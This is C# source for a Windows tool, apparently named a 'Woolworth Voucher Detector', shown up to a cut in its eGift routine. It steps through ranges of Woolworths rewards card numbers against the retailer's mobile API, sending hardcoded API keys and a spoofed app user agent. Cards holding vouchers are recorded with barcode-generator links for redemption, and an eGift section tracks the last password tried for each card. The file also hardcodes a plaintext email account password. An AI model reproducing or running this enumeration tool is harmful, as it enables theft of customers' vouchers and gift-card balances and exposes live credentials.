using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Net.Sockets;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Web.Script.Serialization;
using System.Windows.Forms;
using System.Xml;
using CommControl;
using System.Globalization;

namespace YueWoolworthVoucherDetector
{
    public partial class Form1 : Form
    {
        public static string version = "4.3";
        public static int timeoutTime = 5000;
        public static int retry = 1;
        public static string gHost = "prod.mobile-api.woolworths.com.au";
        public static bool printDtailsLog = true;
        public static string requestContentType = "application/json";
        public static string gAccept = "application/json";
        public static string gUserAgent = "okhttp/2.7.5";
        public string gKey = "dGxkN0RHanpRdjNWRzI2RlcxdkxiMUFzd3hiU0tQYm06MTQ5OTIxMTgxMA==";
        public string gDigest = "f94baf95401d373e13363dbde8c0e4459007b83d";
        public string gUdid = "ec56eec2ba9657a2";
        public static string whiteFile = "WhiteList.txt";
        public static string blackList = "BlackList.txt";
        public static string eGiftValidList = "eGiftValid.xml";
        public static string soldList = "SoldList.txt";
        public string whileFilePath = "";
        public string blackFilePath = "";
        public string initFilePath = "";
        public bool stop = false;
        string MailUserName = "teemo.dai@foxmail.com";
        string password = "dyyr7921|129@603";
        string server_address = "smtp.qq.com";
        string server_port = "587";
        string FromEmail = "teemo.dai@foxmail.com";
        string ToEmail = "teemo.dai@foxmail.com";
        //string ToEmail = "3565244868@qq.com";
        bool EnableSsl = true;
        public static bool isRuning = false;
        string finalFile = "";
        string valueFile = "";
        string globalInitFile = "";
        public static string eGiftValidFile = "";

        string initFieldStartAll = "StartAll";
        string initFieldStopAll = "StopAll";
        string initFieldChangeTheKeys = "ChangeTheKeyPair";

        string globalInitFieldTotalCount = "TotalCount";
        string globalInitFieldTonightCount = "TonightCount";

        static int currentCount = 0;

        public Form1()
        {
            InitializeComponent();
            this.Text = "WVD_" + version + "_" + Path.GetFileName(AppDomain.CurrentDomain.BaseDirectory.Remove(AppDomain.CurrentDomain.BaseDirectory.Length-1));
            initFilePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "YueWoolworth.ini");
            if (File.Exists(initFilePath))
            {
                string[] lines = File.ReadAllLines(initFilePath);
                foreach (string line in lines)
                {
                    if (line.Contains("Key:"))
                    {
                        textBoxKey.Text = line.Replace("Key:", "");
                    }
                    if (line.Contains("Digest:"))
                    {
                        textBoxDigest.Text = line.Replace("Digest:", "");
                    }
                    if (line.Contains("Udid:"))
                    {
                        textBoxUdid.Text = line.Replace("Udid:", "");
                    }
                    if (line.Contains("From:"))
                    {
                        numericUpDown1.Value = decimal.Parse(line.Replace("From:", ""));
                    }
                    if (line.Contains("To:"))
                    {
                        numericUpDown2.Value = decimal.Parse(line.Replace("To:", ""));
                    }
                    if (line.Contains("Folders:"))
                    {
                        textBoxFolders.Text = line.Replace("Folders:", "");
                    }
                }
            }
            else
            {
                File.WriteAllText(
                    initFilePath, 
                    "Key:" + gKey + Environment.NewLine 
                    + "Digest:" + gDigest + Environment.NewLine 
                    + "Udid:" + gUdid + Environment.NewLine
                    + "From:" + numericUpDown1.Value + Environment.NewLine 
                    + "To:" + numericUpDown2.Value + Environment.NewLine
                    + "Folders:" + textBoxFolders.Text + Environment.NewLine
                    );
            }
            whileFilePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, whiteFile);
            File.AppendAllText(whileFilePath, "");
            blackFilePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, blackList);
            File.AppendAllText(blackFilePath, "");
            eGiftValidFile = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, eGiftValidList);

            finalFile = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Result.txt");
            valueFile = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Value.txt");

            string fahterFolder = Directory.GetParent(
                    Directory.GetParent(AppDomain.CurrentDomain.BaseDirectory).ToString())
                    .ToString();
            globalInitFile = Path.Combine(fahterFolder, "Global.ini");
            if (!File.Exists(globalInitFile))
            {
                File.WriteAllText(
                    globalInitFile,
                    globalInitFieldTotalCount + ":0" + Environment.NewLine
                    + globalInitFieldTonightCount + ":0" + Environment.NewLine
                    );
            }

            openFileDialog1.InitialDirectory = AppDomain.CurrentDomain.BaseDirectory;

            new Thread(() =>
            {
                keepReadingInit();
            }).Start();
        }

        private void keepReadingInit()
        {
            BackgroundWorker bw = new BackgroundWorker();
            bw.WorkerReportsProgress = true;
            bw.DoWork += new DoWorkEventHandler(
            delegate (object o, DoWorkEventArgs args)
            {
                BackgroundWorker b = o as BackgroundWorker;
                try
                {
                    Thread.CurrentThread.IsBackground = true;
                    while (true)
                    {
                        string initString = File.ReadAllText(initFilePath);
                        if (initString.Contains(initFieldStartAll + ":True"))
                        {
                            initString = initString.Replace(initFieldStartAll + ":True", initFieldStartAll + ":False");
                            File.WriteAllText(initFilePath, initString);
                            if (!isRuning)
                            {
                                stop = false;
                                new Thread(() =>
                                {
                                    //start();
                                    startEGift();
                                }).Start();
                            }
                        }
                        Thread.Sleep(10 * 1000);
                    }
                }
                catch (Exception e)
                {
                    string logPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "\\Log.txt");
                    File.AppendAllText(logPath, global::System.DateTime.Now + ": " + e + Environment.NewLine);
                    b.ReportProgress(100);
                    return;
                }
                finally
                {
                }
            });

            bw.ProgressChanged += new ProgressChangedEventHandler(
            delegate (object o, ProgressChangedEventArgs args)
            {
            });

            bw.RunWorkerCompleted += new RunWorkerCompletedEventHandler(
            delegate (object o, RunWorkerCompletedEventArgs args)
            {
                try
                {
                    keepReadingInit();
                }
                catch (Exception e)
                {
                    string logPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "\\Log.txt");
                    File.AppendAllText(logPath, global::System.DateTime.Now + ": " + e + Environment.NewLine);
                    return;
                }
                finally
                {

                }
            });

            bw.RunWorkerAsync();
        }


        #region Util Functions
        public delegate void setLog(RichTextBox rtb, string str1);
        public delegate void setLogWithColor(RichTextBox rtb, string str1, Color color1);
        public void setLogT(RichTextBox r, string s)
        {
            if (printDtailsLog)
            {
                if (r.InvokeRequired)
                {
                    setLog sl = new setLog(delegate (RichTextBox rtb, string text)
                    {
                        rtb.AppendText(text + Environment.NewLine);
                    });
                    r.Invoke(sl, r, s);
                }
                else
                {
                    r.AppendText(s + Environment.NewLine);
                }
            }
        }
        public void setLogtColorful(RichTextBox r, string s, Color c)
        {
            if (r.InvokeRequired)
            {
                setLogWithColor sl = new setLogWithColor(delegate (RichTextBox rtb, string text, Color color)
                {
                    rtb.AppendText(text + Environment.NewLine);
                    int i = 0;
                    if (rtb.Text.Length >= 2)
                    {
                        i = rtb.Text.LastIndexOf("\n", rtb.Text.Length - 2);
                    }
                    if (i < 0)
                    {
                        i = 0;
                    }
                    rtb.Select(i, rtb.Text.Length);
                    rtb.SelectionColor = color;
                    rtb.Select(i, rtb.Text.Length);
                    rtb.SelectionFont = new Font(rtb.Font, FontStyle.Bold);
                });
                r.Invoke(sl, r, s, c);
            }
            else
            {
                r.AppendText(s + Environment.NewLine);
                int i = 0;
                if (r.Text.Length >= 2)
                {
                    i = r.Text.LastIndexOf("\n", r.Text.Length - 2);
                }
                if (i < 0)
                {
                    i = 0;
                }
                r.Select(i, r.Text.Length);
                r.SelectionColor = c;
                r.Select(i, r.Text.Length);
                r.SelectionFont = new Font(r.Font, FontStyle.Bold);
            }
        }
        public void setRequest(HttpWebRequest req, CookieCollection cookies)
        {
            req.Timeout = timeoutTime;
            req.Host = gHost;
            req.UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0";
            req.AllowAutoRedirect = false;
            req.CookieContainer = new CookieContainer();
            req.CookieContainer.PerDomainCapacity = 40;
            if (cookies != null)
            {
                req.CookieContainer.Add(cookies);
            }
            /*
            if (xmlRequest)
            {
                req.ContentType = "text/xml; encoding='utf-8'";
            }
            else
            {
                req.ContentType = "application/x-www-form-urlencoded";
            }
            */
            req.ContentType = requestContentType;
            req.UserAgent = gUserAgent;
            req.Headers.Add("X-Auth-Key", gKey);
            req.Headers.Add("X-Auth-Digest", gDigest);
            req.Accept = gAccept;
        }
        public int writePostData(HttpWebRequest req, string postData, bool xmlRequest = false, bool jsonRequest = true)
        {
            byte[] postBytes = Encoding.UTF8.GetBytes(postData);
            //           (xmlRequest ? Encoding.ASCII.GetBytes(postData) : Encoding.UTF8.GetBytes(postData));

            if (xmlRequest)
            {
                req.ContentLength = postBytes.Length;
            }


            if (jsonRequest)
            {
                using (var streamWriter = new StreamWriter(req.GetRequestStream()))
                {
                    streamWriter.Write(postData);
                    streamWriter.Flush();
                    streamWriter.Close();
                }
            }
            else
            {
                //req.ContentLength = postBytes.Length;  // cause InvalidOperationException: 写入开始后不能设置此属性。
                Stream postDataStream = null;
                try
                {
                    postDataStream = req.GetRequestStream();
                    postDataStream.Write(postBytes, 0, postBytes.Length);
                }
                catch (WebException webEx)
                {
                    return -1;
                }
                postDataStream.Close();
            }

            return 1;
        }
        public string resp2html(HttpWebResponse resp)
        {
            try
            {
                if (resp.StatusCode == HttpStatusCode.OK || resp.StatusCode == HttpStatusCode.Found)
                {
                    StreamReader stream = new StreamReader(resp.GetResponseStream());
                    return stream.ReadToEnd();
                }
                else
                {
                    return resp.StatusDescription;
                }
            }
            catch (Exception e)
            {
                return e.Message;
            }
        }
        private byte[] GetBytes(WebResponse response)
        {
            var length = (int)response.ContentLength;
            byte[] data;

            using (var memoryStream = new MemoryStream())
            {
                var buffer = new byte[0x100];
                try
                {
                    using (var rs = response.GetResponseStream())
                    {
                        for (var i = rs.Read(buffer, 0, buffer.Length); i > 0; i = rs.Read(buffer, 0, buffer.Length))
                        {
                            memoryStream.Write(buffer, 0, i);
                        }
                    }
                }
                catch (Exception e)
                {

                }


                data = memoryStream.ToArray();
            }

            return data;
        }
        private string GetEncodingFromBody(byte[] buffer)
        {
            var regex = new Regex(@"<meta(\s+)http-equiv(\s*)=(\s*""?\s*)content-type(\s*""?\s+)content(\s*)=(\s*)""text/html;(\s+)charset(\s*)=(\s*)(?<charset>[a-zA-Z0-9-]+?)""(\s*)(/?)>", RegexOptions.IgnoreCase | RegexOptions.Compiled);
            var str = Encoding.ASCII.GetString(buffer);
            var regMatch = regex.Match(str);
            if (regMatch.Success)
            {
                var charSet = regMatch.Groups["charset"].Value;
                return charSet;
            }

            return Encoding.ASCII.BodyName;
        }
        public string resp2html(HttpWebResponse resp, string charSet)
        {
            var buffer = GetBytes(resp);
            if (resp.StatusCode == HttpStatusCode.OK || resp.StatusCode == HttpStatusCode.Found)
            {
                if (String.IsNullOrEmpty(charSet) || string.Compare(charSet, "ISO-8859-1") == 0)
                {
                    charSet = GetEncodingFromBody(buffer);
                }

                try
                {
                    var encoding = Encoding.GetEncoding(charSet);  //Shift_JIS
                    var str = encoding.GetString(buffer);

                    return str;
                }
                catch (Exception ex)
                {
                    return string.Empty;
                }
            }
            else
            {
                return resp.StatusDescription;
            }

        }
        public string sendRequest(string url, string method, string referer, bool allowAutoRedirect, string postData, ref CookieCollection cookies, string host, bool responseInUTF8)
        {
            for (int i = 0; i < retry; i++)
            {
                HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url);
                HttpWebResponse resp = null;
                setRequest(req, cookies);
                req.Method = method;
                req.Referer = referer;
                if (allowAutoRedirect)
                {
                    req.AllowAutoRedirect = true;
                }
                req.Host = host;
                if (method.Equals("POST"))
                {
                    if (writePostData(req, postData) < 0)
                    {
                        continue;
                    }
                }
                string respHtml = "";
                string errorMessage = "";
                try
                {
                    resp = (HttpWebResponse)req.GetResponse();
                }
                catch (WebException webEx)
                {
                    if (webEx.Status == WebExceptionStatus.ConnectionClosed)
                    {
                        //return "wrong address"; //地址错误
                        throw webEx;
                    }
                    /*
                    if (webEx.Status == WebExceptionStatus.ProtocolError)
                    {
                        //return "ProtocolError";
                        throw webEx;
                    }
                    */
                    bool AcceptableException = false;
                    if (webEx.Message.Contains("(400)"))
                    {
                        AcceptableException = true;
                        if (webEx.Response != null)
                        {
                            if (webEx.Response != null)
                            {
                                using (var errorResponse = (HttpWebResponse)webEx.Response)
                                {
                                    using (var reader = new StreamReader(errorResponse.GetResponseStream()))
                                    {
                                        errorMessage = reader.ReadToEnd();
                                        //TODO: use JSON.net to parse this string and look at the error message
                                    }
                                }
                            }
                        }
                    }
                    if (!AcceptableException)
                    {
                        if(i < retry - 1) {
                            continue;
                        }
                        else
                        {
                            throw webEx;
                        }
                    }
                }
                if(errorMessage != "")
                {
                    return errorMessage;
                }
                else if (resp != null)
                {
                    if (responseInUTF8)
                    {
                        respHtml = resp2html(resp);
                    }
                    else
                    {
                        respHtml = resp2html(resp, resp.CharacterSet); // like  Shift_JIS
                    }
                    if (respHtml.Equals(""))
                    {
                        continue;
                    }
                    cookies = req.CookieContainer.GetCookies(req.RequestUri);
                    resp.Close();
                    return respHtml;
                }
                else
                {
                    continue;
                }
            }
            return "";
        }
        public void writeInit()
        {
            string[] lines = File.ReadAllLines(initFilePath);
            for (int i = 0; i < lines.Length; i++)
            {
                if (lines[i].Contains("Key:"))
                {
                    lines[i] = "Key:" + textBoxKey.Text;
                    continue;
                }
                if (lines[i].Contains("Digest:"))
                {
                    lines[i] = "Digest:" + textBoxDigest.Text;
                    continue;
                }
                if (lines[i].Contains("Udid:"))
                {
                    lines[i] = "Udid:" + textBoxUdid.Text;
                    continue;
                }
                if (lines[i].Contains("From:"))
                {
                    lines[i] = "From:" + numericUpDown1.Value;
                    continue;
                }
                if (lines[i].Contains("To:"))
                {
                    lines[i] = "To:" + numericUpDown2.Value;
                    continue;
                }
                if (lines[i].Contains("Folders:"))
                {
                    lines[i] = "Folders:" + textBoxFolders.Text;
                    continue;
                }
            }
            File.WriteAllLines(initFilePath, lines);
        }
        public static bool AddCredentialCode(string number)
        {
            XmlDocument doc = new XmlDocument();
            if (File.Exists(eGiftValidFile))
            {
                if (File.ReadAllText(eGiftValidFile).Contains(number))
                {
                    return false;
                }
                doc.Load(eGiftValidFile);
            }
            else
            {
                doc = new XmlDocument();
                XmlDeclaration xmlDeclaration = doc.CreateXmlDeclaration("1.0", "UTF-8", null);
                XmlElement root = doc.DocumentElement;
                doc.InsertBefore(xmlDeclaration, root);
                XmlElement body = doc.CreateElement(string.Empty, "body", string.Empty);
                doc.AppendChild(body);
            }
            XmlNode elementbody = doc.SelectSingleNode("/body");
            if (elementbody == null)
            {
                elementbody = doc.CreateElement(string.Empty, "body", string.Empty);
                doc.AppendChild(elementbody);
            }
            XmlElement element1 = doc.CreateElement(string.Empty, "eGift" + number, string.Empty);
            elementbody.AppendChild(element1);
            /*
            {
                string current = elementbody.LastChild.Name;
                int index = int.Parse(current.Replace("eGiftCard", "")) + 1;
                XmlElement element1 = doc.CreateElement(string.Empty, "eGiftCard" + index, string.Empty);
                elementbody.AppendChild(element1);
                XmlElement element11 = doc.CreateElement(string.Empty, "CredentialCode", string.Empty);
                element11.InnerText = number;
                element1.AppendChild(element11);
                XmlElement element12 = doc.CreateElement(string.Empty, "Password", string.Empty);
                element1.AppendChild(element12);
            }
            */
            doc.Save(eGiftValidFile);
            return true;
        }
        public static void ChangePassword(string number, string password)
        {
            XmlDocument doc = new XmlDocument();
            doc.Load(eGiftValidFile);
            XmlNode node = doc.SelectSingleNode("//" + "eGift" + number);
            /* jump to save time
            if (node == null)
            {
                throw new Exception(number + " does not exist in eGiftValid List ");
            }
            */
            node.InnerText = password;
            doc.Save(eGiftValidFile);
        }
        public static int GetLastTriedPassword(string number)
        {
            XmlDocument doc = new XmlDocument();
            doc.Load(eGiftValidFile);
            XmlNode node = doc.SelectSingleNode("//" + "eGift" + number);
            /* jump to save time
            if (node == null)
            {
                throw new Exception(number + " does not exist in eGiftValid List ");
            }
            */
            return int.Parse(node.InnerText);
        }
        public static DataTable CsvToDataTable(string strFilePath)
        {

            if (File.Exists(strFilePath))
            {

                string[] Lines;
                string CSVFilePathName = strFilePath;

                Lines = File.ReadAllLines(CSVFilePathName);

                string[] Fields;
                Fields = Lines[0].Split(new char[] { ',' });
                int Cols = Fields.GetLength(0);
                DataTable dt = new DataTable();
                //1st row must be column names; force lower case to ensure matching later on.
                for (int i = 0; i < Cols; i++)
                    dt.Columns.Add(Fields[i], typeof(string));
                DataRow Row;
                int rowcount = 0;
                try
                {
                    string[] ToBeContinued = new string[] { };
                    for (int i = 1; i < Lines.GetLength(0); i++)
                    {
                        if (!Lines[i].Equals(""))
                        {
                            Fields = Lines[i].Split(new char[] { ',' });

                            if (Fields.GetLength(0) < Cols)
                            {
                                if (ToBeContinued.GetLength(0) > 0)
                                {
                                    ToBeContinued[ToBeContinued.Length - 1] += "\n" + Fields[0];
                                    Fields = Fields.Skip(1).ToArray();
                                }
                                string[] newArray = new string[ToBeContinued.Length + Fields.Length];
                                Array.Copy(ToBeContinued, newArray, ToBeContinued.Length);
                                Array.Copy(Fields, 0, newArray, ToBeContinued.Length, Fields.Length);
                                ToBeContinued = newArray;
                                if (ToBeContinued.GetLength(0) >= Cols)
                                {
                                    Fields = ToBeContinued;
                                    ToBeContinued = new string[] { };
                                }
                                else
                                {
                                    continue;
                                }
                            }

                            //modified by teemo @2016 09 13
                            //handle ',' and '"'
                            //Deserialize CSV following Excel's rule:
                            // 1: If there is commas in a field, quote the field.
                            // 2: Two consecutive quotes indicate a user's quote.

                            List<int> singleLeftquota = new List<int>();
                            List<int> singleRightquota = new List<int>();

                            //combine fileds if number of commas match
                            if (Fields.GetLength(0) > Cols)
                            {
                                bool lastSingleQuoteIsLeft = true;
                                for (int j = 0; j < Fields.GetLength(0); j++)
                                {
                                    bool leftOddquota = false;
                                    bool rightOddquota = false;
                                    if (Fields[j].StartsWith("\""))
                                    {
                                        int numberOfConsecutiveQuotes = 0;
                                        foreach (char c in Fields[j]) //start with how many "
                                        {
                                            if (c == '"')
                                            {
                                                numberOfConsecutiveQuotes++;
                                            }
                                            else
                                            {
                                                break;
                                            }
                                        }
                                        if (numberOfConsecutiveQuotes % 2 == 1)//start with odd number of quotes indicate system quote
                                        {
                                            leftOddquota = true;
                                        }
                                    }

                                    if (Fields[j].EndsWith("\""))
                                    {
                                        int numberOfConsecutiveQuotes = 0;
                                        for (int jj = Fields[j].Length - 1; jj >= 0; jj--)
                                        {
                                            if (Fields[j].Substring(jj, 1) == "\"") // end with how many "
                                            {
                                                numberOfConsecutiveQuotes++;
                                            }
                                            else
                                            {
                                                break;
                                            }
                                        }

                                        if (numberOfConsecutiveQuotes % 2 == 1)//end with odd number of quotes indicate system quote
                                        {
                                            rightOddquota = true;
                                        }
                                    }
                                    if (leftOddquota && !rightOddquota)
                                    {
                                        singleLeftquota.Add(j);
                                        lastSingleQuoteIsLeft = true;
                                    }
                                    else if (!leftOddquota && rightOddquota)
                                    {
                                        singleRightquota.Add(j);
                                        lastSingleQuoteIsLeft = false;
                                    }
                                    else if (Fields[j] == "\"") //only one quota in a field
                                    {
                                        if (lastSingleQuoteIsLeft)
                                        {
                                            singleRightquota.Add(j);
                                        }
                                        else
                                        {
                                            singleLeftquota.Add(j);
                                        }
                                    }
                                }
                                if (singleLeftquota.Count == singleRightquota.Count)
                                {
                                    int insideCommas = 0;
                                    for (int indexN = 0; indexN < singleLeftquota.Count; indexN++)
                                    {
                                        insideCommas += singleRightquota[indexN] - singleLeftquota[indexN];
                                    }
                                    if (Fields.GetLength(0) - Cols == insideCommas) //matched
                                    {
                                        String[] temp = new String[Fields.GetLength(0)];
                                        int totalOffSet = 0;
                                        for (int iii = 0; iii < Fields.GetLength(0) - totalOffSet; iii++)
                                        {
                                            bool combine = false;
                                            int storedIndex = 0;
                                            for (int iInLeft = 0; iInLeft < singleLeftquota.Count; iInLeft++)
                                            {
                                                if (iii + totalOffSet == singleLeftquota[iInLeft])
                                                {
                                                    combine = true;
                                                    storedIndex = iInLeft;
                                                    break;
                                                }
                                            }
                                            if (combine)
                                            {
                                                int offset = singleRightquota[storedIndex] - singleLeftquota[storedIndex];
                                                for (int combineI = 0; combineI <= offset; combineI++)
                                                {
                                                    temp[iii] += Fields[iii + totalOffSet + combineI] + ",";
                                                }
                                                temp[iii] = temp[iii].Remove(temp[iii].Length - 1, 1);
                                                totalOffSet += offset;
                                            }
                                            else
                                            {
                                                temp[iii] = Fields[iii + totalOffSet];
                                            }
                                        }
                                        Fields = temp;
                                    }
                                }
                            }
                            Row = dt.NewRow();
                            for (int f = 0; f < Cols; f++)
                            {
                                Fields[f] = Fields[f].Replace("\"\"", "\""); //Two consecutive quotes indicate a user's quote
                                if (Fields[f].StartsWith("\""))
                                {
                                    if (Fields[f].EndsWith("\""))
                                    {
                                        Fields[f] = Fields[f].Remove(0, 1);
                                        if (Fields[f].Length > 0)
                                        {
                                            Fields[f] = Fields[f].Remove(Fields[f].Length - 1, 1);
                                        }
                                    }
                                }
                                Row[f] = Fields[f];
                            }
                            dt.Rows.Add(Row);
                            rowcount++;
                        }
                    }
                }
                catch (Exception ex)
                {
                    throw new Exception("row: " + (rowcount + 2) + ", " + ex.Message);
                }
                //OleDbConnection connection = new OleDbConnection(string.Format(@"Provider=Microsoft.Jet.OLEDB.4.0;Data Source={0}; Extended Properties=""text;HDR=Yes;FMT=Delimited"";", FilePath + FileName));
                //OleDbCommand command = new OleDbCommand("SELECT * FROM " + FileName, connection);
                //OleDbDataAdapter adapter = new OleDbDataAdapter(command);
                //DataTable dt = new DataTable();
                //adapter.Fill(dt);
                //adapter.Dispose();
                return dt;
            }
            else
                return null;

            //OleDbConnection connection = new OleDbConnection(string.Format(@"Provider=Microsoft.Jet.OLEDB.4.0;Data Source={0}; Extended Properties=""text;HDR=Yes;FMT=Delimited"";", strFilePath));
            //OleDbCommand command = new OleDbCommand("SELECT * FROM " + strFileName, connection);
            //OleDbDataAdapter adapter = new OleDbDataAdapter(command);
            //DataTable dt = new DataTable();
            //adapter.Fill(dt);
            //return dt;
        }
        public static void DataTableToCsv(DataTable table, string file)
        {
            string title = "";
            FileStream fs = new FileStream(file, FileMode.Create);
            StreamWriter sw = new StreamWriter(new BufferedStream(fs), System.Text.Encoding.Default);
            for (int i = 0; i < table.Columns.Count; i++)
            {
                title += table.Columns[i].ColumnName + ",";
            }
            title = title.Substring(0, title.Length - 1) + "\r\n";
            sw.Write(title);

            foreach (DataRow row in table.Rows)
            {
                string line = "";
                for (int i = 0; i < table.Columns.Count; i++)
                {
                    line += "\"" + row[i].ToString().Replace("\"", "\"\"") + "\",";
                }
                line = line.Substring(0, line.Length - 1) + "\r\n";
                sw.Write(line);
            }

            sw.Close();
            fs.Close();
        }
        #endregion



        private void button1_Click(object sender, EventArgs e)
        {
            writeInit();

            if (!isRuning) {
                stop = false;
                new Thread(() =>
                {
                    //start();
                    startEGift();
                }).Start();
            }
        }

        public void start()
        {
            setLogtColorful(richTextBox1, DateTime.Now.ToString() + " Start to detect within Range", Color.Blue);
            isRuning = true;
            string MyVoucher = "";
            CookieCollection cookie = new CookieCollection();
            if (File.Exists(whileFilePath))
            {
                MyVoucher += File.ReadAllText(whileFilePath) + Environment.NewLine;
            }
            if (File.Exists(blackFilePath))
            {
                MyVoucher += File.ReadAllText(blackFilePath) + Environment.NewLine;
            }
            decimal i = 0;
            int InternalServerErrorCount = 0;
            for (i = numericUpDown1.Value; i<=numericUpDown2.Value; i++)
            {
                if (stop)
                {
                    setLogtColorful(richTextBox1, DateTime.Now.ToString() + " Stopped by user", Color.Blue);
                    break;
                }
                if (MyVoucher.Contains(i.ToString()))
                {
                    continue;
                }
                string initStr = File.ReadAllText(initFilePath);
                if (initStr.Contains(initFieldStopAll + ":True"))
                {
                    initStr = initStr.Replace(initFieldStopAll + ":True", initFieldStopAll + ":False");
                    File.WriteAllText(initFilePath, initStr);
                    stop = true;
                    richTextBox1.Clear();
                    setLogtColorful(richTextBox1, DateTime.Now.ToString() + " User Stop All and Clean All screen logs", Color.Blue);
                    break;
                }
                if (initStr.Contains(initFieldChangeTheKeys + ":True")) 
                {
                    initStr = initStr.Replace(initFieldChangeTheKeys + ":True", initFieldChangeTheKeys + ":False");
                    File.WriteAllText(initFilePath, initStr);
                    string[] lines = initStr.Split('\n');
                    foreach (string line in lines)
                    {
                        if (line.Contains("Key:"))
                        {
                            textBoxKey.Text = line.Replace("Key:", "").Replace("\r","");
                        }
                        if (line.Contains("Digest:"))
                        {
                            textBoxDigest.Text = line.Replace("Digest:", "").Replace("\r", "");
                        }
                        if (line.Contains("Udid:"))
                        {
                            textBoxUdid.Text = line.Replace("Udid:", "").Replace("\r", "");
                        }
                    }
                }
                gKey = textBoxKey.Text;
                gDigest = textBoxDigest.Text;
                gUdid = textBoxUdid.Text;
                try
                {
                    //string response = sendRequest(
                    //    "https://prod.mobile-api.woolworths.com.au/money/v1/cardInfo?size=hdpi&apikey=tld7DGjzQv3VG26FW1vLb1AswxbSKPbm&udid=ec56eec2ba9657a2 ",
                    //    "POST",
                    //    "",
                    //    false,
                    //    @"{""rewardsCardNo"":""9353221235531""}",
                    //    ref cookie,
                    //    gHost,
                    //    true
                    //);

                    string response = sendRequest(
                       "https://prod.mobile-api.woolworths.com.au/money/v2/rewards/balance?udid=" + gUdid,
                       "POST",
                       "",
                       false,
                       @"{""rewardsCardNo"":""" + i.ToString() + @"""}",
                       ref cookie,
                       gHost,
                       true
                    );
                    InternalServerErrorCount = 0;
                    var json_serializer = new JavaScriptSerializer();
                    var routes_list = (IDictionary<string, object>)json_serializer.DeserializeObject(response);
                    if(routes_list.ContainsKey("data") 
                        && ((IDictionary<string, object>)routes_list["data"]).ContainsKey("rewardbalance")
                        )
                    {
                        var data = (IDictionary<string, object>)(((IDictionary<string, object>)routes_list["data"])["rewardbalance"]);
                        decimal Voucher = decimal.Parse(data["currentVoucherBalance"].ToString());
                        decimal Point = decimal.Parse(data["currentPointBalance"].ToString());
                        decimal WowPoint = decimal.Parse(data["currentWowPointBalance"].ToString());
                        if (Voucher > 20)
                        {
                            string result = i.ToString() + ", Voucher: " + Voucher + ", Point: " + Point + ", WowPoint: " + WowPoint;
                            File.AppendAllLines(whileFilePath, new[] { result });
                            string value = @"http://barcode.tec-it.com/en/EAN13?data=" + i.ToString() + ";              " + Voucher;
                            File.AppendAllLines(valueFile, new[] { value });
                            //MyVoucher += result + Environment.NewLine; //will update this variable at beginning of start
                            setLogtColorful(richTextBox1, result, Color.Green);
                        }
                        else if (Voucher == 20)
                        {
                            currentCount++;
                            string result = i.ToString() + ", Voucher: " + Voucher + ", Point: " + Point + ", WowPoint: " + WowPoint;
                            File.AppendAllLines(whileFilePath, new[] { result });
                            string final = @"http://barcode.tec-it.com/en/EAN13?data=" + i.ToString();
                            File.AppendAllLines(finalFile, new[] { final });
                            int total = 0;
                            int tonight = 0;
                            string[] lines = File.ReadAllLines(globalInitFile);
                            for(int j = 0; j < lines.Length; j++)
                            {
                                if (lines[j].Contains(globalInitFieldTotalCount + ":"))
                                {
                                    total = int.Parse(lines[j].Replace(globalInitFieldTotalCount + ":","")) + 1;
                                    lines[j] = globalInitFieldTotalCount + ":" + total;
                                    continue;
                                }
                                if (lines[j].Contains(globalInitFieldTonightCount + ":"))
                                {
                                    tonight = int.Parse(lines[j].Replace(globalInitFieldTonightCount + ":", "")) + 1;
                                    lines[j] = globalInitFieldTonightCount + ":" + tonight;
                                    continue;
                                }
                            }
                            File.WriteAllLines(globalInitFile, lines);
                            Invoke(new Action(() =>
                            {
                                label6.Text = "Find $20: Total:" + total + "; Tonight:" + tonight + "; Current:" + currentCount;
                            }));
                            //MyVoucher += result + Environment.NewLine; //will update this variable at beginning of start
                            setLogtColorful(richTextBox1, result, Color.Green);

                        }
                        else if (Voucher > 0)
                        {
                            string result = i.ToString() + ", Voucher: " + Voucher + ", Point: " + Point + ", WowPoint: " + WowPoint;
                            File.AppendAllLines(whileFilePath, new[] { result });
                            //MyVoucher += result + Environment.NewLine; //will update this variable at beginning of start
                            setLogtColorful(richTextBox1, result, Color.Blue);
                        }
                        else
                        {
                            setLogT(richTextBox1, DateTime.Now.ToString() + " Used number: " + i.ToString());
                            File.AppendAllLines(blackFilePath, new[] { i.ToString() });
                        }
                    }
                    else
                    {
                        setLogT(richTextBox1, DateTime.Now.ToString() + " Invalid number: " + i.ToString());
                        File.AppendAllLines(blackFilePath, new[] { i.ToString() });
                    }
                }
                catch (Exception e)
                {
                    setLogtColorful(richTextBox1, DateTime.Now.ToString() + " when probing " + i.ToString() + ": " + e.Message, Color.Red);
                    if (e.Message.Contains("Internal Server Error"))
                    {
                        InternalServerErrorCount++;
                        if (InternalServerErrorCount >= 3)
                        { 
                            setLogtColorful(richTextBox1, DateTime.Now.ToString() + " Stop for expired key ", Color.Blue);
                            stop = true;
                        }
                    }
                }
            }
            if(i > numericUpDown2.Value)
            { 
                setLogtColorful(richTextBox1, DateTime.Now.ToString() + " All numbers in this Range have been detected! ", Color.Green);
            }
            isRuning = false;
        }

        public void startEGift()
        {
            setLogtColorful(richTextBox1, DateTime.Now.ToString() + " Start to detect within Range", Color.Blue);
            isRuning = true;
            string MyVoucher = "";
            CookieCollection cookie = new CookieCollection();
            if (File.Exists(whileFilePath))
            {
                MyVoucher += File.ReadAllText(whileFilePath) + Environment.NewLine;
            }
            if (File.Exists(blackFilePath))
            {
                MyVoucher += File.ReadAllText(blackFilePath) + Environment.NewLine;
            }
            decimal i = 0;
            int InternalServerErrorCount = 0;
            for (i = numericUpDown1.Value; i <= numericUpDown2.Value; i++)
            {
                if (stop)
                {
                    setLogtColorful(richTextBox1, DateTime.Now.ToString() + " Stopped by user", Color.Blue);
                    break;
                }
                if (MyVoucher.Contains(i.ToString()))
                {
